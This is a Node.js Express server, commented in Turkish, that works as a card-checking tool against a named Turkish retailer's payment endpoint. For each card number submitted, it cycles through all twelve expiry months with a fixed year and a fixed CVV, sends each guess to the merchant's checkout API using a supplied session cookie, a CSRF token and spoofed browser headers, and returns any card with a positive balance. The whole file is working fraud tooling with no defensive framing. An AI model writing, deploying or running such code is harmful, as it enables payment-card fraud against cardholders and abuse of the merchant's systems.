// server.js
const express = require('express');
const { URLSearchParams } = require('url');
const fetch = require('node-fetch');
const cors = require('cors'); 
const app = express();
// Render için dinamik port kullanımı
const port = process.env.PORT || 3000; 

// Sabitler
const API_URL = "https://www.happy.com.tr/index.php?route=payment/creditcard/checkPoint";
const FIXED_YEAR = "2028";
const FIXED_CVV = "000";

// Orta katmanlar (Middleware)
app.use(cors());
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));

/**
 * Tek bir kartı kontrol eder (12 aydan 1 aya doğru) ve bulunan ilk puanı döner.
 */
async function checkSingleCard(cardNumber, headers, csrfToken) {
    // Kartı 12. aydan 1. aya doğru döngüye al
    for (let m = 12; m >= 1; m--) {
        const month = m.toString().padStart(2, '0');
        
        const data = {
            "banka": "akbank",
            "cardtype": "2",
            "cardname": "axess",
            "cc_cvv": FIXED_CVV,
            "taksit_sec": "1",
            "cc_number": cardNumber,
            "cc_month": month,
            "cc_year": FIXED_YEAR,
            "useAmountInt": "",
            "useAmountDecimal": "",
            "csrfToken": csrfToken 
        };

        const body = new URLSearchParams(data).toString();

        try {
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: headers,
                body: body
            });

            const text = await response.text();
            
            try {
                const result = JSON.parse(text);
                if (result && typeof result.amount === 'string' && parseFloat(result.amount) > 0) {
                    // Puan bulundu! Anında sonucu dön ve döngüyü sonlandır.
                    return { 
                        success: true, 
                        cardNumber: cardNumber,
                        expiry: `${month}/${FIXED_YEAR}`,
                        amount: result.amount
                    };
                }
            } catch (jsonError) {
                // JSON parse hatası (genellikle puan yok demektir)
            }
        } catch (fetchError) {
            // Network hatası
            return { 
                success: false, 
                error: `Bağlantı hatası: ${fetchError.message}`
            };
        }
    }
    
    // 12 ay denendi ve puan bulunamadı.
    return { success: false, cardNumber: cardNumber, error: "Puan bulunamadı." };
}

/**
 * Express POST Rotası: Sadece TEK BİR KART kontrolünü yapar.
 */
app.post('/check_card', async (req, res) => {
    // Ön yüzden tekil kartı yakala (Rota: /check_card)
    const cardNumber = req.body.card; 
    
    const cookieHeader = req.header('x-app-cookie');
    const csrfTokenValue = req.header('x-app-csrf');

    if (!cookieHeader || !csrfTokenValue || !cardNumber) {
        return res.status(400).json({ error: "Eksik bilgi (Cookie, CSRF veya Kart Numarası)." });
    }

    const dynamicHeaders = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": cookieHeader,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Origin": "https://www.happy.com.tr",
        "Referer": "https://www.happy.com.tr/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    };
    
    // Tek kartı kontrol et
    const result = await checkSingleCard(cardNumber, dynamicHeaders, csrfTokenValue);

    // Sonucu ön yüze geri gönder
    res.json(result);
});


// Statik dosyaları (index.html) sunmak için kök dizini ayarla
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(port, () => {
    console.log(`🚀 Node.js Sunucusu port ${port} adresinde çalışıyor...`);
});
